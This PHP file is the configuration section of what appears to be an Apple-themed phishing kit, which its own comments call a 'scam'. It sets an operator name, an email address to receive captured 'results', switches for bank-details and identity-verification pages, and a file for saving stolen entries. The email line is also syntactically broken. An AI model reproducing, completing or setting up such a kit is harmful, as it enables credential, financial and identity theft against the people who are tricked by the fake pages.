<?php
	error_reporting(E_ERROR | E_PARSE);
	//Put your name.
	$sp_name = "JODY MONCADA";

	//Put your email to receive the result.
	$send_email = "dr.injection@hotmail.com;

	//For use the old login put 'old', for the new login put 'new'.
	$login_theme = "new";

	//If you want to show Secure Page in scam put true, otherwise put false.
	$secure_page = true;

	//If you want to show Bank Page in scam put true, otherwise put false.
	$bank_page = true;

	//If you want to show Identity Page in scam put true, otherwise put false.
	$identity_page = true;

	//Please change the name of result file, For protect your result.
	$savefile_name = "result.html";

	//If you want to save result in HTML put true, otherwise put false.
	$save_result = true;
	/*
	#///////////////////////////////////////////////////#
	# __   __ _    ____ ____   ____ ___  __  __  
	# \ \ / // \  / ___/ ___| / ___/ _ \|  \/  | 
	#  \ V // _ \ \___ \___ \| |  | | | | |\/| | 
	#   | |/ ___ \ ___) |__) | |__| |_| | |  | | 
	#   |_/_/   \_\____/____/ \____\___/|_|  |_| 
	#  
	apple
	*/
?>